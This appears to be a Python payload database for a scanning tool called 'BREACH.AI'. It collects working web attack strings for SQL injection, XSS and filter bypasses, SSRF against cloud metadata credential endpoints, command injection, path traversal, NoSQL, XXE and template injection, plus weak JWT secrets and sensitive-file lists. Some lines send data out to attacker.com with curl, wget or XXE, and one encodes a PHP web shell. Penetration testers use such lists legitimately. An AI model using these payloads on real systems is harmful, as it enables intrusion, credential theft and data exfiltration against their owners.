"""
BREACH.AI - God Level Payload Database
=======================================
Comprehensive payloads for all attack types.
These are REAL payloads that find REAL vulnerabilities.
"""

# =============================================================================
# SQL INJECTION PAYLOADS
# =============================================================================

SQLI_ERROR_BASED = [
    # Basic quotes
    "'", "\"", "`", "'))", "\")",
    # Classic OR-based
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "') OR ('1'='1", "') OR ('1'='1'--",
    # Admin bypass
    "admin'--", "admin' #", "admin'/*",
    "' OR 1=1 LIMIT 1--", "' OR 1=1 LIMIT 1#",
    # Error-based extraction
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND 1=1 UNION SELECT NULL,NULL,NULL--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password,3 FROM users--",
    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
    "' UNION ALL SELECT NULL,NULL,CONCAT(username,':',password) FROM users--",
    # MySQL specific
    "' AND 1=1 ORDER BY 1--",
    "' AND 1=1 ORDER BY 10--",
    "' AND 1=1 ORDER BY 100--",
    "-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    "-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
    # PostgreSQL specific
    "'; SELECT pg_sleep(5)--",
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' UNION SELECT NULL,current_user,NULL--",
    # MSSQL specific
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=1; EXEC xp_cmdshell('whoami')--",
    # SQLite specific
    "' UNION SELECT sql,NULL,NULL FROM sqlite_master--",
    "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--",
]

SQLI_BLIND_BOOLEAN = [
    "' AND 1=1--", "' AND 1=2--",
    "' AND 'a'='a", "' AND 'a'='b",
    "' AND (SELECT 1)=1--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1--",
    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--",
    "1 AND 1=1", "1 AND 1=2",
    "1' AND '1'='1", "1' AND '1'='2",
]

SQLI_TIME_BASED = [
    # MySQL
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "' OR SLEEP(5)--",
    "1' AND (SELECT SLEEP(5))--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=2,SLEEP(5),0)--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    # PostgreSQL
    "'; SELECT pg_sleep(5);--",
    "' AND pg_sleep(5)--",
    "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:5';--",
    "' AND WAITFOR DELAY '0:0:5'--",
    "1; IF (1=1) WAITFOR DELAY '0:0:5'--",
    # Oracle
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    # SQLite
    "' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))))--",
]

SQLI_ERRORS_PATTERNS = [
    # MySQL specific errors (tight patterns)
    "you have an error in your sql syntax",
    "supplied argument is not a valid mysql",
    "warning: mysql_",
    "warning: mysqli_",
    "mysql_fetch_",
    "mysql_num_rows",
    # PostgreSQL specific errors
    "warning: pg_",
    "pg_query(): query failed",
    "pg_exec(): query failed",
    "unterminated quoted string at or near",
    "syntax error at or near",
    "error: column .* does not exist",
    # SQLite specific errors
    "warning: sqlite_",
    "warning: sqlite3_",
    "sqlite3.operationalerror",
    "unrecognized token:",
    # Oracle specific errors
    "ora-00933",  # SQL command not properly ended
    "ora-00936",  # missing expression
    "ora-00942",  # table or view does not exist
    "ora-01756",  # quoted string not properly terminated
    # MSSQL specific errors
    "microsoft ole db provider for sql server",
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "microsoft sql native client error",
    # Generic but specific patterns (must have error context)
    "sql syntax.*error",
    "syntax error in sql",
    "database error.*query",
    "query failed.*sql",
    "sql command not properly ended",
    "quoted string not properly terminated",
    "unterminated quoted string",
    "unexpected end of sql command",
]

# =============================================================================
# XSS PAYLOADS
# =============================================================================

XSS_BASIC = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror="alert(1)">',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
]

XSS_EVENT_HANDLERS = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    '" onclick="alert(1)" x="',
    '" onload="alert(1)" x="',
    '" onerror="alert(1)" x="',
    "' onmouseover='alert(1)' x='",
    '" onmouseenter="alert(1)',
    '" onanimationend="alert(1)" style="animation:spin 1s"',
]

XSS_WAF_BYPASS = [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert(1)</script >',
    '<script >alert(1)</script>',
    '<<script>script>alert(1)</script>',
    '<img src=x onerror=alert`1`>',
    '<svg/onload=alert`1`>',
    '<img src=x onerror=alert&lpar;1&rpar;>',
    '<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>',
    '<script>\\u0061lert(1)</script>',
    '<img src=x onerror="&#x61;lert(1)">',
    '<svg onload=eval(atob("YWxlcnQoMSk="))>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    '"><img src=x onerror=alert(1)//',
    '<script>/**/alert(1)/**/</script>',
    '<script>alert(1)//</script>',
]

XSS_POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
]

# =============================================================================
# SSRF PAYLOADS
# =============================================================================

SSRF_LOCALHOST = [
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8000",
    "http://localhost",
    "http://localhost:80",
    "http://0.0.0.0",
    "http://0.0.0.0:80",
    "http://[::1]",
    "http://[::1]:80",
    "http://[0:0:0:0:0:0:0:1]",
]

SSRF_CLOUD_METADATA = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/id",
    "http://169.254.169.254/metadata/v1/hostname",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/opc/v2/instance/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
]

SSRF_BYPASS = [
    # IP obfuscation
    "http://2130706433",  # 127.0.0.1 as decimal
    "http://0x7f000001",  # 127.0.0.1 as hex
    "http://017700000001",  # 127.0.0.1 as octal
    "http://127.1",
    "http://127.0.1",
    "http://0",
    "http://0.0.0.0",
    # DNS rebinding
    "http://spoofed.burpcollaborator.net",
    "http://localtest.me",
    "http://127.0.0.1.nip.io",
    # URL encoding
    "http://%31%32%37%2e%30%2e%30%2e%31",
    "http://127.0.0.1%00.evil.com",
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
    "dict://127.0.0.1:6379/info",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]

SSRF_INDICATORS = [
    # AWS metadata (specific format)
    "ami-id\ni-",
    "instance-id\ni-",
    "instance-type\n",
    "local-ipv4\n10.",
    "local-ipv4\n172.",
    "iam/security-credentials/",
    # GCP metadata
    "computeMetadata/v1/",
    "project-id\n",
    "service-accounts/default/",
    # Azure metadata
    '"subscriptionId":',
    '"resourceGroupName":',
    '"vmId":',
    # Redis INFO response
    "redis_version:",
    "connected_clients:",
    "used_memory:",
    # Internal service indicators (must be structured)
    '"status":"internal"',
    '"host":"localhost"',
    '"host":"127.0.0.1"',
]

# =============================================================================
# COMMAND INJECTION PAYLOADS
# =============================================================================

CMDI_PAYLOADS = [
    # Basic
    "; id", "| id", "|| id", "& id", "&& id",
    "; whoami", "| whoami", "|| whoami", "& whoami", "&& whoami",
    "`id`", "$(id)", "`whoami`", "$(whoami)",
    # File read
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; cat /etc/shadow", "| cat /etc/shadow",
    "; type C:\\Windows\\win.ini", "| type C:\\Windows\\win.ini",
    # Network
    "; curl http://attacker.com/?a=$(whoami)",
    "; wget http://attacker.com/?a=$(id)",
    "; ping -c 3 attacker.com",
    # Time-based
    "; sleep 5", "| sleep 5", "|| sleep 5",
    "; ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
    # Encoded
    ";%20id", "|%20id", "%26%26%20id",
    # Newline injection
    "%0aid", "%0awhoami", "\nid", "\nwhoami",
    # Environment
    "; env", "| env", "; set", "| set",
    "; printenv", "| printenv",
    # Reverse shell indicators (just detection, not actual shells)
    "; nc -e /bin/sh", "; bash -i",
]

CMDI_INDICATORS = [
    # id command output (full format only)
    "uid=0(root)",
    "uid=33(www-data)",
    "uid=1000(",
    "gid=0(root)",
    # /etc/passwd format (full line pattern)
    "root:x:0:0:",
    "root:*:0:0:",
    "daemon:x:1:1:",
    "nobody:x:65534:",
    "www-data:x:33:33:",
    # ls -la output (must have permissions AND size)
    "drwxr-xr-x",
    "drwxrwxr-x",
    "-rw-r--r--",
    "-rwxr-xr-x",
    # win.ini sections (full header)
    "[extensions]",
    "[fonts]",
    "[mci extensions]",
]

# =============================================================================
# PATH TRAVERSAL / LFI PAYLOADS
# =============================================================================

LFI_PAYLOADS = [
    # Basic traversal
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    # Windows
    "..\\windows\\win.ini", "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
    # Null byte (legacy)
    "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
    "../../../etc/passwd\x00", "../../../etc/passwd\x00.jpg",
    # Double encoding
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    # Filter bypass
    "....//....//....//etc/passwd",
    r"....\/....\/....\/etc/passwd",
    "..../..../..../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    # Wrapper (PHP)
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "php://filter/read=string.rot13/resource=../../../etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    # Absolute paths
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "/proc/self/cmdline",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "C:\\Windows\\win.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

LFI_SENSITIVE_FILES = {
    "linux": [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/etc/ssh/sshd_config", "/etc/mysql/my.cnf", "/etc/nginx/nginx.conf",
        "/etc/apache2/apache2.conf", "/proc/self/environ", "/proc/self/cmdline",
        "/proc/version", "/var/log/auth.log", "/root/.bash_history",
        "/root/.ssh/id_rsa", "/home/*/.ssh/id_rsa", "~/.bashrc",
    ],
    "windows": [
        "C:\\Windows\\win.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM", "C:\\boot.ini",
        "C:\\inetpub\\wwwroot\\web.config", "C:\\xampp\\apache\\conf\\httpd.conf",
    ],
    "application": [
        ".env", ".env.local", ".env.production", ".env.development",
        "config.php", "config.json", "config.yaml", "config.yml",
        "database.yml", "settings.py", "application.properties",
        "wp-config.php", ".htaccess", "web.config",
    ],
}

LFI_INDICATORS = [
    # /etc/passwd format (must have full line structure)
    "root:x:0:0:root:/root:",
    "root:*:0:0:root:/root:",
    "daemon:x:1:1:daemon:",
    "nobody:x:65534:65534:",
    "www-data:x:33:33:",
    # win.ini sections
    "[extensions]",
    "[fonts]",
    "[mci extensions]",
    # /proc/self/environ (must have multiple vars together)
    "DOCUMENT_ROOT=/",
    "SERVER_SOFTWARE=",
    "PATH=/usr/",
    # .env file format (must have = assignment)
    "DB_PASSWORD=",
    "DB_HOST=",
    "DATABASE_URL=",
    "SECRET_KEY=",
    "API_KEY=",
    "AWS_ACCESS_KEY=",
    "AWS_SECRET_KEY=",
]

# =============================================================================
# NOSQL INJECTION PAYLOADS
# =============================================================================

NOSQL_PAYLOADS = [
    # MongoDB operator injection
    '{"$gt": ""}', '{"$ne": ""}', '{"$ne": null}',
    '{"$regex": ".*"}', '{"$regex": "^a"}',
    '{"$where": "1==1"}', '{"$where": "this.password.match(/.*/)"}',
    '{"$or": [{"a": "a"}, {"b": "b"}]}',
    # Query string injection
    '[$ne]=1', '[$gt]=', '[$regex]=.*',
    'username[$ne]=admin&password[$ne]=admin',
    'username[$gt]=&password[$gt]=',
    # JavaScript injection
    "'; return true; var x='",
    "'; return this.password; var x='",
    "'; while(true){}; var x='",
    "'; return this.username == 'admin'; var x='",
    # Auth bypass
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    '{"username": "admin", "password": {"$ne": ""}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]

# =============================================================================
# XXE PAYLOADS
# =============================================================================

XXE_PAYLOADS = [
    # Basic XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    # XXE with parameter entities
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
    # XXE OOB (Out-of-Band)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?x=file:///etc/passwd">]><foo>&xxe;</foo>',
    # XXE SSRF
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    # SVG XXE
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
]

# =============================================================================
# SSTI (Server-Side Template Injection) PAYLOADS
# =============================================================================

SSTI_PAYLOADS = [
    # Detection
    "${7*7}", "{{7*7}}", "#{7*7}", "<%= 7*7 %>",
    "${7*'7'}", "{{7*'7'}}",
    "{{config}}", "{{self}}", "${T(java.lang.Runtime)}",
    # Jinja2 (Python)
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    # Twig (PHP)
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # Freemarker (Java)
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    # ERB (Ruby)
    "<%= system('id') %>", "<%= `id` %>",
    # Smarty (PHP)
    "{php}echo `id`;{/php}",
]

# =============================================================================
# IDOR INDICATORS
# =============================================================================

IDOR_PARAMS = [
    "id", "user_id", "userId", "uid", "user",
    "account_id", "accountId", "account",
    "order_id", "orderId", "order",
    "doc_id", "docId", "document_id", "documentId",
    "file_id", "fileId", "file",
    "project_id", "projectId", "project",
    "org_id", "orgId", "organization_id",
    "tenant_id", "tenantId", "tenant",
    "record_id", "recordId", "record",
    "item_id", "itemId", "item",
]

# =============================================================================
# AUTHENTICATION BYPASS
# =============================================================================

AUTH_BYPASS_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-Host", "localhost"),
    ("X-Host", "localhost"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("True-Client-IP", "127.0.0.1"),
    ("Client-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("CF-Connecting-IP", "127.0.0.1"),
]

AUTH_BYPASS_PATHS = [
    # Path normalization
    "/admin", "/Admin", "/ADMIN", "/aDmIn",
    "/admin/", "/admin//", "/./admin", "//admin",
    "/admin;", "/admin.html", "/admin.json",
    "/admin%20", "/admin%09", "/admin%00",
    "/%2e/admin", "/admin%2f", "/admin..;/",
    # Hidden admin paths
    "/administrator", "/manager", "/management",
    "/dashboard", "/control", "/panel",
    "/backend", "/backoffice", "/internal",
    "/debug", "/console", "/system",
    "/api/admin", "/api/internal", "/api/debug",
]

# =============================================================================
# JWT PAYLOADS
# =============================================================================

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key",
    "jwt_secret", "jwt-secret", "jwtSecret",
    "your-256-bit-secret", "your-secret-key",
    "secret123", "supersecret", "s3cr3t",
    "changeme", "test", "development", "production",
    "", "null", "undefined", "none",
]

# =============================================================================
# WORDLIST FOR ENDPOINT DISCOVERY
# =============================================================================

ENDPOINT_WORDLIST = [
    # API versions
    "api", "api/v1", "api/v2", "api/v3", "v1", "v2", "v3",
    # Common endpoints
    "users", "user", "accounts", "account", "profile", "profiles",
    "auth", "login", "logout", "register", "signup", "signin",
    "admin", "administrator", "dashboard", "panel", "console",
    "settings", "config", "configuration", "options",
    "search", "query", "find", "lookup",
    "upload", "download", "file", "files", "media", "images",
    "data", "export", "import", "backup", "restore",
    "webhook", "webhooks", "callback", "notify", "notification",
    "health", "healthz", "status", "ping", "info", "version",
    "debug", "test", "dev", "development", "staging",
    "graphql", "graphiql", "playground",
    "swagger", "docs", "api-docs", "openapi",
    "metrics", "prometheus", "stats", "analytics",
    "internal", "private", "secret", "hidden",
    # CRUD operations
    "create", "read", "update", "delete", "list", "get", "set",
    "add", "remove", "edit", "modify", "change",
    # Resources
    "orders", "products", "items", "cart", "checkout", "payment",
    "invoices", "transactions", "billing", "subscription",
    "messages", "chat", "comments", "posts", "feed",
    "documents", "docs", "reports", "logs",
    "teams", "groups", "organizations", "workspaces",
    "projects", "tasks", "issues", "tickets",
    # Actions
    "reset", "verify", "confirm", "activate", "deactivate",
    "enable", "disable", "approve", "reject", "cancel",
    "send", "receive", "process", "execute", "run",
]

SENSITIVE_FILES = [
    ".env", ".env.local", ".env.production", ".env.development",
    ".env.staging", ".env.test", ".env.backup",
    ".git/config", ".git/HEAD", ".git/logs/HEAD",
    ".svn/entries", ".svn/wc.db",
    ".htaccess", ".htpasswd", "web.config",
    "config.php", "config.json", "config.yaml", "config.yml",
    "database.yml", "settings.py", "local_settings.py",
    "wp-config.php", "configuration.php",
    "package.json", "package-lock.json", "composer.json", "composer.lock",
    "Gemfile", "Gemfile.lock", "requirements.txt", "Pipfile",
    "Dockerfile", "docker-compose.yml", ".dockerignore",
    "backup.sql", "dump.sql", "database.sql", "db.sql",
    "backup.zip", "backup.tar.gz", "backup.tar",
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
    ".ssh/authorized_keys", ".ssh/known_hosts",
    "server.key", "server.crt", "privatekey.pem",
    "credentials.json", "secrets.json", "keys.json",
    "firebase.json", "serviceAccount.json", "google-services.json",
    "phpinfo.php", "info.php", "test.php",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    ".DS_Store", "Thumbs.db", "desktop.ini",
]
